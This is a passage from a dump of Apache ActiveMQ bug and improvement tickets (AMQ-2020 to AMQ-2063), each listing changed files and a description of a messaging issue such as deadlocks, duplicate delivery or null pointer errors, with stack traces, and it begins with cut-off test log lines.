worker3 received msg A remaining 82008-11-26 15:26:01,130 INFO  &#91;Thread-4&#93; &#91;com.test.MessageGroupDelayedTest&#93; worker3 received msg B remaining 82008-11-26 15:26:02,130 INFO  &#91;Thread-4&#93; &#91;com.test.MessageGroupDelayedTest&#93; worker3 received msg C remaining 82008-11-26 15:26:02,224 INFO  &#91;Thread-4&#93; &#91;com.test.MessageGroupDelayedTest&#93; worker3 received msg A remaining 72008-11-26 15:26:07,224 INFO  &#91;Thread-4&#93; &#91;com.test.MessageGroupDelayedTest&#93; worker3 received msg B remaining 72008-11-26 15:26:08,224 INFO  &#91;Thread-4&#93; &#91;com.test.MessageGroupDelayedTest&#93; worker3 received msg C remaining 72008-11-26 15:26:08,333 INFO  &#91;Thread-4&#93; &#91;com.test.MessageGroupDelayedTest&#93; worker3 received msg A remaining 62008-11-26 15:26:13,333 INFO  &#91;Thread-4&#93; &#91;com.test.MessageGroupDelayedTest&#93; worker3 received msg B remaining 62008-11-26 15:26:14,333 INFO  &#91;Thread-4&#93; &#91;com.test.MessageGroupDelayedTest&#93; worker3 received msg C remaining 62008-11-26 15:26:14,427 INFO  &#91;Thread-4&#93; &#91;com.test.MessageGroupDelayedTest&#93; worker3 received msg A remaining 52008-11-26 15:26:19,427 INFO  &#91;Thread-4&#93; &#91;com.test.MessageGroupDelayedTest&#93; worker3 received msg B remaining 52008-11-26 15:26:20,427 INFO  &#91;Thread-4&#93; &#91;com.test.MessageGroupDelayedTest&#93; worker3 received msg C remaining 52008-11-26 15:26:20,536 INFO  &#91;Thread-4&#93; &#91;com.test.MessageGroupDelayedTest&#93; worker3 received msg A remaining 42008-11-26 15:26:25,536 INFO  &#91;Thread-4&#93; &#91;com.test.MessageGroupDelayedTest&#93; worker3 received msg B remaining 42008-11-26 15:26:26,536 INFO  &#91;Thread-4&#93; &#91;com.test.MessageGroupDelayedTest&#93; worker3 received msg C remaining 42008-11-26 15:26:26,630 INFO  &#91;Thread-4&#93; &#91;com.test.MessageGroupDelayedTest&#93; worker3 received msg A remaining 32008-11-26 15:26:31,630 INFO  &#91;Thread-4&#93; &#91;com.test.MessageGroupDelayedTest&#93; worker3 received msg B remaining 32008-11-26 15:26:32,630 INFO  &#91;Thread-4&#93; &#91;com.test.MessageGroupDelayedTest&#93; worker3 received msg C remaining 32008-11-26 15:26:32,739 INFO  &#91;Thread-4&#93; &#91;com.test.MessageGroupDelayedTest&#93; worker3 received msg A remaining 22008-11-26 15:26:37,739 INFO  &#91;Thread-4&#93; &#91;com.test.MessageGroupDelayedTest&#93; worker3 received msg B remaining 22008-11-26 15:26:38,739 INFO  &#91;Thread-4&#93; &#91;com.test.MessageGroupDelayedTest&#93; worker3 received msg C remaining 22008-11-26 15:26:38,833 INFO  &#91;Thread-4&#93; &#91;com.test.MessageGroupDelayedTest&#93; worker3 received msg A remaining 12008-11-26 15:26:43,832 INFO  &#91;Thread-4&#93; &#91;com.test.MessageGroupDelayedTest&#93; worker3 received msg B remaining 12008-11-26 15:26:44,832 INFO  &#91;Thread-4&#93; &#91;com.test.MessageGroupDelayedTest&#93; worker3 received msg C remaining 12008-11-26 15:26:44,926 INFO  &#91;Thread-4&#93; &#91;com.test.MessageGroupDelayedTest&#93; worker3 received msg A remaining 02008-11-26 15:26:49,926 INFO  &#91;Thread-4&#93; &#91;com.test.MessageGroupDelayedTest&#93; worker3 received msg B remaining 02008-11-26 15:26:50,926 INFO  &#91;Thread-4&#93; &#91;com.test.MessageGroupDelayedTest&#93; worker3 received msg C remaining 0
issueID:AMQ-2020
type:Bug
changed files:
texts:Messages are arriving out of sequence with large message volumes
With large volumes of messages, some messages can arrive out of order on occasion. Scenario is hard to reproduce but a single producer and single consumer can cause the problem if the volume is sufficiently high. The Producer needs to exceed the memory limit such that the cache is filled and when the broker moves over to the store from the cache, the consumer need to ack a message that will be redelivered from the store but would normally be suppressed as a duplicate. One way to avoid the problem is to disable the cache for a Queue:<amq:policyEntry queue=">" useCache="false" >
issueID:AMQ-2021
type:Bug
changed files:LoggingBrokerPlugin.java
MutableBrokerFilter.java
RegionBroker.java
RedeliveryPlugin.java
TopicSubscription.java
AdvisoryBroker.java
Broker.java
ErrorBroker.java
EmptyBroker.java
BrokerFilter.java
DiscardingDLQBroker.java
PrefetchSubscription.java
texts:durable subscriber gets stuck while using persistent delivery mode and client acknowledgment with session.recover().
Using two topic durable subscribers which consume every odd message and recover their session if message number is even one of the durable subscriper after couple hundred messages get stuck and  java.lang.NullPointerException is shown on provider console.Reproducing steps:1. start amq server using default configuration.2. run TopicRedeliver.3. run TopicProducer.Discovered during test of  https://issues.apache.org/activemq/browse/AMQ-1797 .See attached logs and java files.
issueID:AMQ-2022
type:Improvement
changed files:
texts:Trimming in web console could be configurable
As a result of AMQ-1969 the web console is trimming the display of message bodies and queue names in dropdowns, and presenting a tooltip insead.  The length at which the tooltip kicks in is far too low, and I would prefer it to be off as I only deal with small message payloads.  It may also be nice to have messages displayed in a scolling div or textarea instead, as tooltips can be awkward to use and copy from when they contain large amounts of text (as will be the case here). Allow for trimming/tooltips to be disabled Allow configurable option of when trimming/tooltip takes place Use a textarea/scrollable div instead of a tooltip Allow configurable option for size at which dropdown values are trimmed
issueID:AMQ-2025
type:Bug
changed files:ActiveMQSessionExecutor.java
texts:More than one Thread can be created for a JMS Session
There is currently no guard around the creation of more than taskRunner in the ActiveMQSessionExecutor.wakeup() call.The wakeup() call cannot itself be synchronized because that will lead to deadlocks.
issueID:AMQ-2028
type:Bug
changed files:ActiveMQSessionExecutor.java
texts:ActiveMQSessionExecutor.taskRunner usage is very non-thread-safe
cmon guys,                    if (taskRunnerCreated.compareAndSet(false, true)) {                        if (taskRunner == null) {                            taskRunner = session.connection.getSessionTaskRunner().createTaskRunner(this,                                    "ActiveMQ Session: " + session.getSessionId());                        }                    }                    taskRunner.wakeup();is not anywhere close to thread safe.I"m seeing JmsClientAckTest and JmsRedeliveredTest failing due to this.
issueID:AMQ-2029
type:Bug
changed files:
texts:non-amq messages don&#39;t get JMS* header properties set on them when sent.
JMS 1.1 spec section 3.4.11 lists properties that should be set from sending a message:JMSDestination, JMSDeliveryMode, JMSExpiration, JMSPriority, JMSMessageID, JMSTimestamp and presumably JMSRedelivered.  These are getting set on the amq-message copy rather than the original message in ActiveMQSession.
issueID:AMQ-2030
type:Bug
changed files:
texts:Topics Delivering Duplicate Messages when have cyclic network of brokers w/multicast discovery
In a cyclic network using m/cast discovery. Every broker knows about ever other broker.Network of 3, broker1, broker2, broker2 - consumer on broker2, producer on broker1problem description:consumer on broker 2 is propagated to broker1 and broker3. Resulting bridged consumer on 1 is propagated to 2 and 3: broker 2 ignores it because of the broker path match. broker 3 bridges it and propagates the resulting consumer to 2 and 1. 2 again ignores as does 1 because of broker path info..Resulting bridged consumer on 3 is now a duplicate of the subscription propagated to 3 via broker 1. This cannot be suppressed using broker path because 3 only sees the brokerpath to broker1.What is needed is a history of the original consumerId in the bridged subscripton such that subsequent subscriptions can be seen as duplicates. ConsumerInfo needs to contain a list of networkConsumerIds.To have this propagated needs a wireFormat version increment.
issueID:AMQ-2032
type:Bug
changed files:
texts:Redelivered messages to consumer skiped due to false duplicate detection on message rollback with Spring and cacheLevel=CACHE_NONE
The failover default brokerUrl in 5.2 activates the message audit facility to catch possible duplicate message delivery in the event of failover. This mechanism can get in the way of message redelivery, particularly when sessions are closed and an automatic rollback kicks in.Original user comment:Redelivery of message fails after a rollback with Spring DMLC with cacheLevel=CACHE_NONE due to a bug in class : "org.apache.activemq.ActiveMQMessageConsumer". Redelivered messages are wrongly detected as duplicates. It fails to call "rollbackDuplicates" on messages processed by consumer on rollback call on the consumer.Sequence: ( See: http://fisheye1.atlassian.com/browse/springframework/spring/src/org/springframework/jms/listener/AbstractPollingMessageListenerContainer.java?r=1.14 ) Spring creates a transaction Spring creates a JMS consumer Spring give message to Application MessageListener class Spring closes the consumer Spring try to commit Commit fails due to a RuntimeException thrown in Application MessageListener class Spring marks the message as RollbackOnly Spring rollbacks messageWhen ActiveMQ closes the consumer ( org.apache.activemq.ActiveMQMessageConsumer ), it clears "deliveredMessages" list. But this list is needed in rollback method of ActiveMQMessageConsumer to rollback duplicates ! Then consumer cannot rollback duplicates on rollback if consumer is closed before rollback action. The only way I found, is to not clear "deliveredMessages" list on close. It seems, there is no side effect, since after a call to "close" method, the consumer is not used anymore.
issueID:AMQ-2033
type:Bug
changed files:
texts:Deadlock on producerWindow.waitForSpace() in ActiveMQMessageProducer
It seems, that producer throttling with producerWindow enabled doesn"t work at all. I"m attaching unit test for this. After sending about ~80msg producer stops and never resumes sending. The problem is that producerWindow is not started ActiveMQMessageProducer. There must be something like this:producerWindow.start();I"m also attaching patch for this bug
issueID:AMQ-2034
type:Bug
changed files:
texts:consumer close with active XA transaction results in java.lang.IllegalArgumentException: The subscription does not exist: ...
consumer.close removes consumer from broker, later xa transaction commit results in exception as beforeEnd ack of messages fails with IllegalState:javax.jms.JMSException: The subscription does not exist: ID:XXXX.dd-52108-1229084857402-0:37:13:1        at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:49)        at org.apache.activemq.ActiveMQConnection.onAsyncException(ActiveMQConnection.java:1692)        at org.apache.activemq.ActiveMQConnection$2$1.run(ActiveMQConnection.java:1637)        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:650)        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:675)        at java.lang.Thread.run(Thread.java:595)Caused by: java.lang.IllegalArgumentException: The subscription does not exist: ID:XXXX.dd-52108-1229084857402-0:37:13:1        at org.apache.activemq.broker.region.AbstractRegion.acknowledge(AbstractRegion.java:364)        at org.apache.activemq.broker.region.RegionBroker.acknowledge(RegionBroker.java:470)        at org.apache.activemq.broker.TransactionBroker.acknowledge(TransactionBroker.java:194)        at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:73)        at org.apache.activemq.broker.MutableBrokerFilter.acknowledge(MutableBrokerFilter.java:84)        at org.apache.activemq.broker.TransportConnection.processMessageAck(TransportConnection.java:442)        at org.apache.activemq.command.MessageAck.visit(MessageAck.java:196)        at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:291)        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:179)        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:143)        at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:206)        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:84)        at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:196)        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:183)
issueID:AMQ-2038
type:Bug
changed files:JournalPersistenceAdapter.java
texts:Broker parameter systemExitOnShutdown="true" not being honored when persistence adapter file system is unavailable
The broker parameter systemExitOnShutdown="true" is not being honored when persistence adapter file system is unavailable. To reproduce the problem: Use journaling persistence pointing to an USB drive diretory. Make sure the broker is configured with systemExitOnShutdown="true":  <amq:broker id="broker" depends-on="jmxServer" useShutdownHook="false" systemExitOnShutdown="true"> ... After the broker is running send some messages to a queue. Unplug the USB drive. Try to send more messages. The broker will reject the messages and report the following exception:javax.jms.JMSException: The volume for a file has been externally altered so that the opened file is no longer valid        at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:49)        at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1203)        at org.apache.activemq.ActiveMQSession.send(ActiveMQSession.java:1648)        at org.apache.activemq.ActiveMQMessageProducer.send(ActiveMQMessageProducer.java:227)        at org.apache.activemq.ActiveMQMessageProducerSupport.send(ActiveMQMessageProducerSupport.java:241)        at org.apache.servicemix.jms.multiplexing.MultiplexingProviderProcessor.process(MultiplexingProviderProcessor.java:114)        at org.apache.servicemix.common.AsyncBaseLifeCycle.doProcess(AsyncBaseLifeCycle.java:540)        at org.apache.servicemix.common.AsyncBaseLifeCycle.processExchange(AsyncBaseLifeCycle.java:492)        at org.apache.servicemix.common.BaseLifeCycle.onMessageExchange(BaseLifeCycle.java:46)        at org.apache.servicemix.jbi.messaging.DeliveryChannelImpl.processInBound(DeliveryChannelImpl.java:621)        at org.apache.servicemix.jbi.nmr.flow.AbstractFlow.doRouting(AbstractFlow.java:172)        at org.apache.servicemix.jbi.nmr.flow.seda.SedaFlow.doRouting(SedaFlow.java:167)        at org.apache.servicemix.jbi.nmr.flow.seda.SedaQueue$1.run(SedaQueue.java:134)        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:650)        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:675)        at java.lang.Thread.run(Thread.java:595)Caused by: java.io.IOException: The volume for a file has been externally altered so that the opened file is no longer valid        at sun.nio.ch.FileChannelImpl.force0(Native Method)        at sun.nio.ch.FileChannelImpl.force(FileChannelImpl.java:359)        at org.apache.activeio.journal.active.LogFile.force(LogFile.java:102)        at org.apache.activeio.journal.active.LogFileManager.append(LogFileManager.java:308)        at org.apache.activeio.journal.active.JournalImpl.queuedWrite(JournalImpl.java:256)        at org.apache.activeio.journal.active.JournalImpl.access$000(JournalImpl.java:62)        at org.apache.activeio.journal.active.JournalImpl$2.run(JournalImpl.java:229)        at edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:665)        at edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:690)        ... 1 moreThis error is not being detected by the broker as a fatal error and the broker is not going down automatically. The issue was reported by a Servicemix user and it is expected that after the AMQ broker goes down SMX must goes down too.
issueID:AMQ-2042
type:New Feature
changed files:NIODataFileAppender.java
DataFileAppender.java
texts:Shutdown broker if default message store cannot access the disk
Default message store should behave the same as the journaled message store (see https://issues.apache.org/activemq/browse/AMQ-2038)
issueID:AMQ-2043
type:Bug
changed files:TopicSubscription.java
texts:Async error occurred: java.lang.NullPointerException
I got the following error in activemq.log, ActiveMQ"s version is 5.2.0.  I found that this kind of exception usually occurs during the reconnection2008-12-10 21:44:04,485 &#91;.15.2.125:47814&#93; ERROR Service                        - Async error occurred: java.lang.NullPointerExceptionjava.lang.NullPointerException        at org.apache.activemq.broker.region.TopicSubscription.acknowledge(TopicSubscription.java:221)        at org.apache.activemq.broker.region.AbstractRegion.acknowledge(AbstractRegion.java:373)        at org.apache.activemq.broker.region.RegionBroker.acknowledge(RegionBroker.java:462)        at org.apache.activemq.broker.TransactionBroker.acknowledge(TransactionBroker.java:194)        at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:74)        at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:74)        at org.apache.activemq.broker.MutableBrokerFilter.acknowledge(MutableBrokerFilter.java:85)        at org.apache.activemq.broker.TransportConnection.processMessageAck(TransportConnection.java:456)        at org.apache.activemq.command.MessageAck.visit(MessageAck.java:205)        at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:305)        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:179)        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:143)        at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:206)        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:84)        at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:203)        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:185)        at java.lang.Thread.run(Thread.java:619)
issueID:AMQ-2044
type:Bug
changed files:PrefetchSubscription.java
texts:Race condition with prefetch set to 0 and receive timeouts
None
issueID:AMQ-2045
type:Bug
changed files:Valve.java
VMTransport.java
texts:Unbalanced Valve usage in VMTransport.
Valve doesn"t check that its state is consistent (counters >= 0).  There"s unbalanced increment/decrement calls in VMTransport.oneway:                 enqueueValve.decrement();  //TODO unbalanced?? (line ~99) If I balance this with a preceding enqueValve.increment() I get a deadlock in a test when the server tries to send a response message so I assume the correct fix is to remove the decrement in this VMTransports valve.
issueID:AMQ-2046
type:Bug
changed files:
texts:ActiveMQTextMessage toString() method throws NPE if text is null
The new toString() method assumes that the message has a non null value, so throws an NPE on line 154 when the message"s text is null.if (text.length() > 63) {should be:if (text!=null && text.length() > 63) {
issueID:AMQ-2047
type:Bug
changed files:FanoutTransport.java
texts:FanoutTransport does not honor the initialReconnectDelay
The TransportHandler does not honor the passed in "initialReconnectDelay" parameter. It has a hard-coded value of "10" milliseconds.Would also like to point out that the code seems to assume that the child transport has been created successfully as soon as the "TransportFactory.compositeConnect()" returns. During runtime, if a given node is down, the exception is actually thrown a little further down the code - when the "restoreTransport()" method is called.
issueID:AMQ-2049
type:Bug
changed files:ConnectionInfo.java
ActiveMQConnection.java
texts:Race condition cleaning connection using VMTransport
This problem arises when the server side has a RegionBroker installed and there is a configured clientID for the connection.ActiveMQConnection.ensureConnectionInfoSent sends the ConnectionInfo object with the configured clientID off to the server.  Currently this results in the same ConnectionInfo object in the AMQConnection and the TransportConnection.Now when you get to AMQConnection.cleanup() it asynchronously sends a message to the broker to clean up and immediately sets the configured clientID to null.  When the RegionBroker processes the remove message the clientID is no longer set (assuming bad luck in thread scheduling) and it complains:    public void removeConnection(ConnectionContext context, ConnectionInfo info, Throwable error) throws Exception {        String clientId = info.getClientId();        if (clientId == null) {            throw new InvalidClientIDException("No clientID specified for connection disconnect request");        }One fix for this is to copy the connectionInfo before sending it to the broker.  This is a small but unnecessary cost for non-vm transports but works.Another fix might be to send the close message synchronously so it"s processed before the clientID is nulled out.I"m committing the "copy" solution but IMO this should be reviewed by experts.
issueID:AMQ-2050
type:Bug
changed files:
texts:Intermittent test failure -- ProxyConnectorTest
message not received on 2nd connection...  <testcase time="16.021" name="testSendAndConsume {deliveryMode=2, destinationType=2}">    <failure type="junit.framework.AssertionFailedError">junit.framework.AssertionFailedError        at junit.framework.Assert.fail(Assert.java:47)        at junit.framework.Assert.assertTrue(Assert.java:20)        at junit.framework.Assert.assertNotNull(Assert.java:220)        at junit.framework.Assert.assertNotNull(Assert.java:213)        at org.apache.activemq.proxy.ProxyConnectorTest.testSendAndConsume(ProxyConnectorTest.java:98)        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)        at java.lang.reflect.Method.invoke(Method.java:585)        at junit.framework.TestCase.runTest(TestCase.java:154)        at junit.framework.TestCase.runBare(TestCase.java:127)        at org.apache.activemq.CombinationTestSupport.runBare(CombinationTestSupport.java:90)        at junit.framework.TestResult$1.protect(TestResult.java:106)        at junit.framework.TestResult.runProtected(TestResult.java:124)        at junit.framework.TestResult.run(TestResult.java:109)        at junit.framework.TestCase.run(TestCase.java:118)        at junit.framework.TestSuite.runTest(TestSuite.java:208)        at junit.framework.TestSuite.run(TestSuite.java:203)        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)        at java.lang.reflect.Method.invoke(Method.java:585)        at org.apache.maven.surefire.junit.JUnitTestSet.execute(JUnitTestSet.java:210)        at org.apache.maven.surefire.suite.AbstractDirectoryTestSuite.executeTestSet(AbstractDirectoryTestSuite.java:135)        at org.apache.maven.surefire.suite.AbstractDirectoryTestSuite.execute(AbstractDirectoryTestSuite.java:160)        at org.apache.maven.surefire.Surefire.run(Surefire.java:81)        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)        at java.lang.reflect.Method.invoke(Method.java:585)        at org.apache.maven.surefire.booter.SurefireBooter.runSuitesInProcess(SurefireBooter.java:182)        at org.apache.maven.surefire.booter.SurefireBooter.main(SurefireBooter.java:743)</failure>  </testcase>
issueID:AMQ-2051
type:Bug
changed files:
texts:Removing a Destination with active subscribers causes the destination to be unable to be removed.
While attempting to implement destination removal in the ActiveMQ-CPP client I noticed that when attempting to remove destination that had active subscribers the destination would be placed in a state that they could not be removed once the subscribers had all been removed.  Sending a DestinationInfo command to the Broker while keeping my consumer open results in an exception which is expected since there are still subscribers.  javax.jms.JMSException: Destination still has an active subscription: topic://TEST.FOO at org.apache.activemq.broker.region.AbstractRegion.removeDestination(AbstractRegion.java:158) at org.apache.activemq.broker.jmx.ManagedTopicRegion.removeDestination(ManagedTopicRegion.java:62) at org.apache.activemq.broker.region.RegionBroker.removeDestination(RegionBroker.java:289) at org.apache.activemq.broker.region.RegionBroker.removeDestinationInfo(RegionBroker.java:312) at org.apache.activemq.broker.BrokerFilter.removeDestinationInfo(BrokerFilter.java:218) at org.apache.activemq.broker.BrokerFilter.removeDestinationInfo(BrokerFilter.java:218) at org.apache.activemq.advisory.AdvisoryBroker.removeDestinationInfo(AdvisoryBroker.java:193) at org.apache.activemq.broker.BrokerFilter.removeDestinationInfo(BrokerFilter.java:218) at org.apache.activemq.broker.MutableBrokerFilter.removeDestinationInfo(MutableBrokerFilter.java:226) at org.apache.activemq.broker.TransportConnection.processRemoveDestination(TransportConnection.java:481) at org.apache.activemq.command.DestinationInfo.visit(DestinationInfo.java:124) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:305) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:179) at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:104) at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68) at org.apache.activemq.transport.vm.VMTransport.iterate(VMTransport.java:205) at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122) at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43) at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:885) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:907) at java.lang.Thread.run(Thread.java:619)Once I removed my consumer and sent the command again I got no errors indicating that it couldn"t be removed, however I could still see the Destination in the Web Console.Looking into the Broker code I see that the RegionBroker class processes a removeDestination call by first removing the Destination from its map of Destinations and then attempting to remove it from the Region that it belongs to.  If this call fails the code will never again attempt to remove a Destination since its removed from the RegionBroker"s map but it may not be removed from the specific region it resides in.  The code looks like it should first attempt to remove the Destination from the region before removing from its map, the addDestination method works in that way, adding it to region before adding it to its map so that if an exception occurs nothing is added.RegionBroker.java : around line 283|    public void removeDestination(ConnectionContext context, ActiveMQDestination destination, long timeout) throws Exception {        if (destinations.remove(destination) != null) {            switch (destination.getDestinationType()) {            case ActiveMQDestination.QUEUE_TYPE:                queueRegion.removeDestination(context, destination, timeout);                break;            case ActiveMQDestination.TOPIC_TYPE:                topicRegion.removeDestination(context, destination, timeout);                break;            case ActiveMQDestination.TEMP_QUEUE_TYPE:                tempQueueRegion.removeDestination(context, destination, timeout);                break;            case ActiveMQDestination.TEMP_TOPIC_TYPE:                tempTopicRegion.removeDestination(context, destination, timeout);                break;            default:                throw createUnknownDestinationTypeException(destination);            }        }    }
issueID:AMQ-2052
type:Bug
changed files:AsyncDataManager.java
MapContainerImpl.java
KahaStore.java
ContainerId.java
texts:unsubscribing a durable subscriber does not properly clean up undelivered messages
Working on the tck I found a lot of messages like 2008-12-25 11:37:08,567 ERROR &#91;RecoveryListenerAdapter&#93; Message id ID:pb.local-56923-1230232035140-2:13:1:1:1 could not be recovered from the data store - already dispatchedin the log.  I can reproduce this with the attached test case (It could probably be in a better module, but I started looking here.)To see the error put a breakpoint at RecoveryListenerAdapter line 61 and run the test.  The required steps to reproduce seem to be:1. create a durable subscriber on a topic.2. send a message to the topic.3. close the subscriber and unsubscribe.4. create a new durable subscriber on the same topic.
issueID:AMQ-2053
type:Bug
changed files:JPAPersistenceAdapter.java
DestinationFactory.java
KahaDBStore.java
JournalPersistenceAdapter.java
JDBCPersistenceAdapter.java
DestinationFactoryImpl.java
KahaPersistenceAdapter.java
Queue.java
AbstractRegion.java
MemoryPersistenceAdapter.java
PersistenceAdapter.java
AMQPersistenceAdapter.java
texts:AMQMessageStore.flushLatch can apparently get stuck
A couple hours into the tck I see everything freeze.  Looking at the threads there are a lot of waits on Queue.dispatchLock in addSubscription but one thread made it through to AMQMessageStore and is waiting at line 316 in flush on the countdown latch.Only problem I can see causing this so far is the countdown in asyncWrite not being in a finally block.  I don"t see any exceptions in the log.... so not sure yet.
issueID:AMQ-2054
type:Bug
changed files:Usage.java
texts:Deadlock in org.apache.activemq.usage.Usage
In highly concurrent environment, client deadlocks with this stack trace. Obiously, there are too many synchronized statements in Usage class. Either you add statements on method declaration, or use synchronized on mutex object. Now for example stop method is declared as synchronized and also locks usageMutex and this causes deadlock.Found one Java-level deadlock:============================="jmsConnector.dispatcher.486":  waiting to lock monitor 0x08528fb0 (object 0xa4b01390, a java.lang.Object),  which is held by "ActiveMQ Transport: tcp://localhost/127.0.0.1:61616""ActiveMQ Transport: tcp://localhost/127.0.0.1:61616":  waiting to lock monitor 0x08528a38 (object 0xa4b01348, a org.apache.activemq.usage.MemoryUsage),  which is held by "jmsConnector.dispatcher.486"Java stack information for the threads listed above:==================================================="jmsConnector.dispatcher.486":        at org.apache.activemq.usage.Usage.stop(Usage.java:306) waiting to lock <0xa4b01390> (a java.lang.Object) locked <0xa4b01348> (a org.apache.activemq.usage.MemoryUsage)        at org.apache.activemq.ActiveMQMessageProducer.dispose(ActiveMQMessageProducer.java:156)        at org.apache.activemq.ActiveMQSession.dispose(ActiveMQSession.java:589) locked <0xa4b091d8> (a org.apache.activemq.ActiveMQSession)        at org.apache.activemq.ActiveMQSession.close(ActiveMQSession.java:555)        at org.apache.activemq.pool.SessionPool.destroyObject(SessionPool.java:81)        at org.apache.commons.pool.impl.GenericObjectPool.addObjectToPool(GenericObjectPool.java:1128)        at org.apache.commons.pool.impl.GenericObjectPool.returnObject(GenericObjectPool.java:1076)        at org.apache.activemq.pool.SessionPool.returnSession(SessionPool.java:67)        at org.apache.activemq.pool.PooledSession.close(PooledSession.java:124)        at org.mule.providers.jms.JmsConnector.close(JmsConnector.java:1003)        at org.mule.providers.jms.JmsConnector.closeQuietly(JmsConnector.java:1017)        at org.mule.providers.jms.JmsMessageDispatcher.dispatchMessage(JmsMessageDispatcher.java:323)        at org.mule.providers.jms.JmsMessageDispatcher.doDispatch(JmsMessageDispatcher.java:64)        at org.mule.providers.AbstractMessageDispatcher$Worker.run(AbstractMessageDispatcher.java:561)        at org.mule.impl.work.WorkerContext.run(WorkerContext.java:310)        at edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:987)        at edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:528)        at java.lang.Thread.run(Thread.java:619)"ActiveMQ Transport: tcp://localhost/127.0.0.1:61616":        at org.apache.activemq.usage.Usage.getExecutor(Usage.java:404) waiting to lock <0xa4b01348> (a org.apache.activemq.usage.MemoryUsage)        at org.apache.activemq.usage.Usage.fireEvent(Usage.java:271)        at org.apache.activemq.usage.Usage.setPercentUsage(Usage.java:232) locked <0xa4b01390> (a java.lang.Object)        at org.apache.activemq.usage.MemoryUsage.decreaseUsage(MemoryUsage.java:146)        at org.apache.activemq.ActiveMQMessageProducer.onProducerAck(ActiveMQMessageProducer.java:289)        at org.apache.activemq.ActiveMQConnection$2.processProducerAck(ActiveMQConnection.java:1675)        at org.apache.activemq.command.ProducerAck.visit(ProducerAck.java:56)        at org.apache.activemq.ActiveMQConnection.onCommand(ActiveMQConnection.java:1647)        at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:104)        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)        at org.apache.activemq.transport.failover.FailoverTransport$3.onCommand(FailoverTransport.java:167)        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:143)        at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:206) locked <0x752c53e8> (a org.apache.activemq.transport.InactivityMonitor$1)        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:84)        at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:203)        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:185)        at java.lang.Thread.run(Thread.java:619)Found 1 deadlock.
issueID:AMQ-2055
type:Bug
changed files:
texts:activemq-all module build fails
Building of the activemq-all module fails with the following message &#91;INFO&#93; Error creating shaded jar.Embedded error: duplicate entry: org/apache/activemq/protobuf/BufferInputStream.class
issueID:AMQ-2061
type:Improvement
changed files:
texts:Timeout on failover transport without interruption of retries
Allow clients to timeout send operations if no brokers are available. This timeout should not interrupt the reconnection procedure and kill the connection. The clients should be able to use the same connection to send messages later, when some of the brokers come back online. The users should use the timeout parameter, such as failover:(tcp://localhost:61616)?timeout=3000to enable this option
issueID:AMQ-2062
type:Improvement
changed files:ActiveMQConnectionFactory.java
texts:ActiveMQConnectionFactory should support a setExceptionListener option to allow an ExceptionListenere to be configured on all created connections
None
issueID:AMQ-2063
type:Improvement
changed files:JDBCPersistenceAdapter.java
texts:JDBC persistence adapter improvements
